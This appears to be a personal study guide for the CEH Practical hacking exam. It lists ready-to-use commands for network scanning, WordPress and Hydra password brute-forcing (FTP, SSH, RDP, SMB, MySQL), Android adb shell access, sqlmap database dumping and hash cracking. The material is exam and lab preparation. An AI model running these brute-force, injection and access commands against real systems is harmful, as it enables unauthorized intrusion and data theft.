# Practicemyself

# .......................................... CEHvs11 ...........................................

I have recently passed the CEH Practical exam from EC-council in December 2022. I have prepared myself, Hope it will helpful to all of you guys. If any suggetions to me just connect with twitter and dm me. "Thank You.."


### Marks:
```
SQL= 2
Net User= 1
Nmap= 2 to find OS
Wireshark= 3
FTP= 2
Wordpress= 1
Secret File= 1 
Android= 1
Crypto=6
Stegnography= 1
```

## So let's start >>>>>>

### 1. Find the IP target.
 ```
  $ ip addr or
  $ ifconfig
  $ netdiscover -r IP/24
  $ netdiscover  (If not found $ apt-get install netdiscover)
  $ netdiscover -i eth0   (confirm from ifconfig which net/wifi using)
  
 May be IP targets are same. For me, this is the IP (172.16.0.0/24) for my target.
 ```
### 2. Nmap scan all
  ```
  $ nmap IP -sV -sC -p -O -oN output.txt
  
  -iL=import IPs,  --top-ports 1000
  ```
### 3. IPs Service, RDP(3389), SQL(3306), FTP(21) check
 ```
  $ nmap -Pn -p 3389 IP | grep open
  $ nmap -Pn -p 3306 IP | grep open
  $ nmap -Pn -p 21 IP | grep open
  ```
### 4. Windows Comman Line
  $ Net user

### 5. Wordlist location find
 ```
  $ locate wordlists
  $ locae rockyou.txt
```
### 6. WP scan (Wp Vulnerability)
```
  $ wpscan --url IP --enumerate u
  $ wpscan --url IP -u root -P passwdfile.txt
  
  --enumerate p, -U username, -P password, --usernames userlist.txt, --passwords passwdlist.txt
  
 I was faced problems with WP Scanner to bruteforicing, I recommend to use Metasploit for bruteforcing in Wordpress passwod.
 keep it mind:- Password wordlist are like same but try to find exact password lists.
  
 Using Metasploit==>
 => msfconsole 
use axiliary/scanner/http/wordpress_login_enum
PASS_FILE /root/Desktop/wordlists/Pass.txt
set RHOSTs IP
set RPORT PORT
set TARGETURI http://IP:port
set USERNAME admin
->run
```
### 7. Hydra
``` 
 Use for FTP:
     $ hydra -l user -P passlist.txt ftp://IP
 Use for SSH:
     $ hydra -l <username> -P passwdlist.txt IP -t 4 ssh
 Use for Web Post:
     $ hydra -l <username> -P <wordlist> 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

- hydra -L usernames.txt -P pass.txt <IP> mysql
- hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V`
- hydra -V -f -L <userslist> -P <passwlist> ***rdp***://<IP>`
- hydra -P common-snmp-community-strings.txt target.com snmp
- hydra -l Administrator -P words.txt 192.168.1.12 smb t 1
```

### 8. FTP
```
FTP Connect
  $ ftp IP
  
  After connect with FTP go to the file
  $ get file.txt
  $ get file1.txt

When I was first connect from the parot server, I did'nt get the file. So I have connected from winodws machine, then i had got the file easily.   
 
https://www.javatpoint.com/ftp-commands
https://www.serv-u.com/linux-ftp-server/commands
```
### 9. Android
```
  $ netdiscover -r IP/24   (got final IP)
  $ nmap IP -sV -p 5555
  
  apt install adb (if not available
  Command:
  $ adb connect IP:5555
  $ adb shell
  pwd > ls > cd sdcard > ls > cd downloads > cat file.txt
```
### 10. Stegnography
  ```
  $ Snow.exe -C -p “given_password” file_name.txt
  -C  compressing / uncompressing
  -p  password

  Open Stego (GUI tool):
     Open the exe > open and select file > click get
 ```
### 11. Cryptography
```
#### Identify:
https://hashes.com/en/tools/hash_identifier
https://www.onlinehashcrack.com/hash-identification.php
https://www.tunnelsup.com/hash-analyzer
#### Crak hash:
https://hashes.com/en/decrypt/hash
https://crackstation.net

  $ hash-identifier  ->Enter and paste the hash.
  $ Hashcat -a 3 -m 900 hash.txt /rockyou.txt
  -a attack mode (3)
  -m hashtype (select number fom below)
   900 = md4
   1800 = SHA512CRYPT
   110  = SHA1 with SALT HASH
   0  = MD5
   100 = SHA1
   1400 = SHA256
  ``` 
## 12. Used Tools
```
Veracrypt = Encryt / Decrypt the Hidden Disk 
Cryptool
Snow
Bctextencoder
Md5 hash calculator
Wpscan
Nmap
Metasploit
Hydra
Wireshark
OWASP ZAP  
RDP
```
### 13. Command Injection (DVWA)
```
DVWA:
Path: C:\wamp64\www\DVWA\hackable\uploads\maybefile

View a file cmd: "type"
Decrypt - https://hashes.com/en/decrypt/hash
```
### 14 SQL Injection with SQLmap:
  ```
  $ sqlmap -u http://site.com?id=1 --cookie="cookies" --risk 3 --level 5 --dbms=mysql --dbs
  $ sqlmap -u "http://site.com/sqli/?id=1&Submit=Submit" --cookie="cookies1;cookies2" --data="data" --risk 3 -level 5 --dbms=mysql --dbs
  $ sqlmap -u "http://site.com/sqli/cookies.php" --cookie="cookies1;cookies2" --data="data" -p id --risk 3 -level 5 --dbms=mysql --dbs
  $ sqlmap -r test.txt --batch --risk 3 --level 4 --dbs
  $ sqlmap -r test.txt --batch --risk 3 --level 4 -D databasename --tables
  $ sqlmap -r test.txt --batch --risk 3 --level 4 -D databasename -T tables name --dump
```
### 15. Wireshark
```
Filters:
To find DOS (SYN and ACK) : tcp.flags.syn == 1, tcp.flags.syn == 1 and tcp.flags.ack == 0
To find passwords : http.request.method == POST
     Shortcut: Click tools > Credentials

https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
https://www.hackers-arise.com/post/2018/09/27/network-forensics-part-2-detecting-and-analyzing-a-scada-dos-attack
```


## Google is your Best Friend
### Everythings are availble on Google
#### Good Luck 👍
